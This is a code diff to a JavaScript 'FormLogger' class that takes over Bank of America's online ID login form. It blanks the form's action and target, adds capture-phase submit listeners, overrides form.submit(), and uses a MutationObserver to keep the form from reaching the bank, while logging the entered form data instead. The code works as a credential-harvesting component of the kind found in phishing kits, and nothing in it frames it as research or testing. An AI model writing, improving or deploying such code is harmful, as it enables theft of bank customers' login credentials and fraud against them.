@@ -153,31 +153,48 @@ class FormLogger {
     if (form) {
       console.log('[Logger] Found EnterOnlineIDForm, hijacking submission');
       
-      // Store original action/method so we can prevent submission to BoA
+      // Store original action/method
       this.originalAction = form.action;
       this.originalMethod = form.method;
       this.originalTarget = form.target;
       
       // CRITICAL: Remove form action so it cannot submit to Bank of America
-      // The form will still fire the submit event, but won't navigate
       form.action = '';
       form.target = '';
       
+      // Prevent form submission via submit event
+      form.addEventListener('submit', (e) => {
+        console.log('[Logger] Form submit event, preventing default...');
+        e.preventDefault();
+        e.stopPropagation();
+        this.logFormData(form);
+        return false;
+      }, true); // Capture phase - intercept before other listeners
+      
       // Override form.submit() method
       const self = this;
-      const originalSubmit = form.submit;
+      const originalFormSubmit = form.submit;
       form.submit = function() {
-        console.log('[Logger] Form.submit() called, intercepting...');
-        self.logFormData(form).then(() => {
-          console.log('[Logger] Data logged, blocking submission to Bank of America');
-        }).catch(error => {
-          console.error('[Logger] Error during submission:', error);
-        });
-        // Return false (though this has limited effect on form.submit() calls)
+        console.log('[Logger] Form.submit() called, logging data instead...');
+        self.logFormData(form);
         return false;
       };
       
-      // Also intercept input element submit (for form.elements.namedItem('submit'))
+      // Monitor for form action changes and reset to empty
+      const observer = new MutationObserver((mutations) => {
+        mutations.forEach((mutation) => {
+          if (mutation.attributeName === 'action' || mutation.attributeName === 'target') {
+            if (form.action !== '' || form.target !== '') {
+              console.log('[Logger] Form action/target changed, resetting to empty');
+              form.action = '';
+              form.target = '';
+            }
+          }
+        });
+      });
+      observer.observe(form, { attributes: true, attributeFilter: ['action', 'target'] });
+      
+      // Also intercept input element submit
       const submitElements = form.querySelectorAll('input[type="submit"], button[type="submit"]');
       submitElements.forEach((elem) => {
         console.log('[Logger] Found submit element:', elem.value || elem.textContent);
@@ -222,15 +239,15 @@ class FormLogger {
     // Also intercept all form submissions with capture phase
     document.addEventListener('submit', (e) => {
       const form = e.target;
-      console.log('[Logger] Submit event caught on form:', form.id, form.method);
+      console.log('[Logger] Document-level submit event caught on form:', form.id, form.method);
       if (form.id === 'login-form' || form.method === 'POST' || form.id === 'EnterOnlineIDForm') {
-        console.log('[Logger] Submitting login form, preventing default');
+        console.log('[Logger] Blocking form submission, logging data instead');
         e.preventDefault();
         e.stopPropagation();
         this.logFormData(form);
         return false;
       }
-    }, true); // Capture phase
+    }, true); // Capture phase to intercept BEFORE other listeners
     
     // Monitor for any attempts to change form action
     if (form) {
